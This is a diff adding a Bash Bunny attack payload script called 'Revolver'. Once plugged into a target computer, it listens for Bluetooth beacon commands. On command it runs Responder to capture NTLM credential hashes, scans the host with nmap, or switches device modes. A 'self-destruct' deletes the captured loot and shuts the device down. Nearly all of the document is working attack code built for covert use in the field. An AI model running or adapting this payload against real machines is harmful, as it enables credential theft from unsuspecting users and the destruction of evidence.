@@ -1,0 +1,261 @@
+# Title:         Revolver
+# Description:   Multiple network attacks and modes based on BLE beacons
+# Author:        saintcrossbow
+# Props:         Hak5Darren (BLE, QuickCreds, nmap)
+# Version:       1.0
+# Category:      General
+# Target:        Windows 10 with minimum powershell usage
+# Attackmodes:   All
+ 
+# Full Description
+# ----------------
+# This payload was made in the style of Q Branch: those that use this need to know they have 
+# multiple options for attack as well as getting out of a bad situation. Switching into this
+# payload will place the Bash Bunny in a command waiting mode. BLE beacons are sent to start
+# attacks, including QuickCreds and nmap. A loot self-destruct option is also available. The
+# payload is easily extendable to include any attack you might need in the field.
+#
+# Note other payloads were co-opted into this multimode attack, and to make it easy I used
+# Hak5Darren's code, partially because I imagine he wants to see these payloads extended, 
+# and also because I know he appreciates Q Branch.
+ 
+# Configuring
+# -----------
+# Change the BLE beacon commands listed in Options below to something unique to you. Definitely
+# do not want someone else activating your Bash Bunny. Also verify the responder and nmap 
+# options are to your liking. 
+
+# Usage
+# -----
+# Plug in to get into command waiting mode (slow white LED). Launch attacks by sending the 
+# right BLE beacon. Make sure to stop the beacon after the attack so you won't go into a loop.
+ 
+# LEDs
+# ----
+# Slow white LED: Awaiting BLE commands
+# Yellow: Attack in progress
+# Red: Self destruct of loot 
+# Blue solid: USB mode
+# Cyan solid: Ethernet mode
+ 
+# Options
+# -------
+REQUIRETOOL responder
+
+# BLE beacon options - change to your preferences. Make sure to use things
+# you'll not encounter since you don't want to start a self-destruct sequence
+# on accident
+ABORT_MISSION="QSTOP"
+START_QUICKCREDS_WIN="QCREDS"
+START_QUICKCREDS_NIX="QCREDNIX"
+START_NMAP="QNMAP"
+START_USB="QLOOT"
+START_ETHER="QETHER"
+START_DEL_LOOT="QSELFD"
+
+# Responder options
+RESPONDER_OPTIONS="-w -r -d P"
+RESPONDER_LOOTDIR=/root/udisk/loot/quickcreds
+# Nmap options
+NMAP_OPTIONS = "-sS -O -sV -F -oA"
+NMAP_LOOTDIR=/root/udisk/loot/nmap
+
+# Setup
+# -----
+LED SETUP
+ 
+ 
+# Responder
+# ---------
+# Note: This is a modified version of quick creds
+# Original by Hak5Darren
+# ---------
+startResponder()
+{
+  CUCUMBER DISABLE
+  # Set convenience variables
+  GET TARGET_HOSTNAME
+  GET TARGET_IP
+ 
+  # Setup named logs in loot directory
+  mkdir -p $RESPONDER_LOOTDIR
+  HOST=${TARGET_HOSTNAME}
+  # If hostname is blank set it to "noname"
+  [[ -z "$HOST" ]] && HOST="noname"
+  COUNT=$(ls -lad $RESPONDER_LOOTDIR/$HOST* | wc -l)
+  COUNT=$((COUNT+1))
+  mkdir -p $RESPONDER_LOOTDIR/$HOST-$COUNT
+ 
+  # As a backup also copy logs to a loot directory in /root/loot/
+  mkdir -p /root/loot/quickcreds/$HOST-$COUNT
+ 
+  # Check target IP address. If unset, blink RED and end.
+  if [ -z "${TARGET_IP}" ]; then
+     LED FAIL2
+     exit 1
+  fi
+ 
+  # Set LED yellow, run attack
+  LED ATTACK
+  cd /tools/responder
+ 
+  # Clean logs directory
+  rm logs/*
+ 
+  # Run Responder with specified options
+  python Responder.py -I usb0 $RESPONDER_OPTIONS &
+ 
+  # Wait until NTLM log is found
+  until [ -f logs/*NTLM* ]
+  do
+     # Ima just loop here until NTLM logs are found
+     sleep 1
+  done
+ 
+  # copy logs to loot directory
+  cp logs/* /root/loot/quickcreds/$HOST-$COUNT
+  cp logs/* $RESPONDER_LOOTDIR/$HOST-$COUNT
+ 
+  # Sync USB disk filesystem
+  sync
+  LED FINISH
+  Q DELAY 1500
+ 
+  # Return to waiting mode
+  CUCUMBER ENABLE
+  LED W SLOW
+}
+
+# Nmap
+# ----
+# Note: This is a modified version of one of the very first payloads, nmap
+# Original by Hak5Darren
+# ----
+startNmap()
+{
+  CUCUMBER DISABLE
+  ATTACKMODE RNDIS_ETHERNET
+
+  GET TARGET_HOSTNAME
+  GET TARGET_IP
+
+  # Setup named logs in loot directory
+  mkdir -p $NMAP_LOOTDIR
+  HOST=${TARGET_HOSTNAME}
+  # If hostname is blank set it to "noname"
+  [[ -z "$HOST" ]] && HOST="noname"
+  COUNT=$(ls -lad $NMAP_LOOTDIR/$HOST*.log | wc -l)
+  COUNT=$((COUNT+1))
+
+  if [ -z ""${TARGET_IP} ]; then
+    LED FAIL
+    Q DELAY 1500
+  else
+    LED ATTACK
+	nmap $NMAP_OPTIONS $TARGET_IP >> $NMAP_LOOTDIR/$HOST-$COUNT.log	
+	sync
+    LED FINISH
+    Q DELAY 1500
+  fi
+  
+  # Return to waiting mode
+  CUCUMBER ENABLE
+  LED W SLOW
+}
+
+startLoot()
+{
+  CUCUMBER DISABLE
+  # We are going for solid LED this time in case the device needs to be played off as normal USB
+  # ... and best of luck to you on that! 
+  LED B SOLID
+  ATTACKMODE STORAGE
+}
+
+# For sharing, getting on via putty, or exiting USB mode
+startEthernet()
+{
+  CUCUMBER DISABLE
+  LED C SOLID
+  ATTACKMODE RNDIS_ETHERNET
+}
+
+
+# Delete everything in loot directory
+# Depending on your engagement, could also delete switch and library - but be careful!
+# Switches to HID to ensure it is not in USB mode or possibly timing out in Ethernet. Going plaid 
+# to delete those files
+startSelfDestruct()
+{
+  ATTACKMODE HID
+  CUCUMBER PLAID
+  LED R SOLID
+  rm -r /root/udisk/loot
+  rm -r /root/loot/
+  sync
+  shutdown now
+}
+ 
+# Main
+# ----
+# Start bluetooth for observation
+source bunny_helpers.sh
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+sleep 1
+echo -n -e "AT+ROLE=2" > /dev/ttyS1
+echo -n -e "AT+RESET" > /dev/ttyS1
+ 
+# Wait for BLE
+CUCUMBER ENABLE
+LED W SLOW
+
+while : 
+do
+  timeout 1s cat /dev/ttyS1 > /tmp/bt_observation
+ 
+  # Shutdown
+  if grep -ao $ABORT_MISSION /tmp/bt_observation; then
+    sync
+    LED FINISH
+    Q DELAY 1500
+    shutdown now
+  fi
+ 
+  # Responder - Windows
+  if grep -ao $START_QUICKCREDS_WIN /tmp/bt_observation; then
+    ATTACKMODE RNDIS_ETHERNET
+    startResponder
+  fi
+ 
+  # Responder - *nix or mac
+  if grep -ao $START_QUICKCREDS_NIX /tmp/bt_observation; then
+    ATTACKMODE ECM_ETHERNET
+    startResponder
+  fi
+ 
+  # Start nmap against host
+  if grep -ao $START_NMAP /tmp/bt_observation; then
+    startNmap
+  fi
+  
+  # Open as USB device
+  if grep -ao $START_USB /tmp/bt_observation; then
+    startLoot
+  fi
+  
+  # Open as Ethernet device
+  if grep -ao $START_ETHER /tmp/bt_observation; then
+    startEthernet
+  fi
+
+  # Limited self-destruct of loot
+  if grep -ao $START_DEL_LOOT /tmp/bt_observation; then
+    startSelfDestruct
+	# Leave the scene after the delete
+	break
+  fi
+ 
+done
+ 
+sync
